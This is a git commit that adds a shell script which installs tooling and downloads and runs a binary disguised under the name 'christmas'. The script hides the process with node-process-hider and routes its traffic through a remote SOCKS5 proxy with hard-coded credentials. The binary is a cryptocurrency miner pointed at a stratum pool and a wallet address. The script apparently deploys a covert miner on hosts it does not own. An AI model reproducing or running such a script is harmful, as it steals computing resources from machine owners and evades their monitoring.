f9e7a2fdeb135c32076b0f7dbe860c33425bf4f1
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-03-02 16:08:33 +0200

    Create start_avx512_AzAz72.ws2.sh

---
+++ start_avx512_AzAz72.ws2.sh
@@ -0,0 +1,38 @@
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 52.15.235.202:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
+chmod +x christmas
+
+ph add christmas
+
+./graftcp/graftcp ./christmas -a gr -o stratum+ssl://stratum-na.rplant.xyz:17056 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.XmasAzAz72 -p webpassword=IhatePopUps
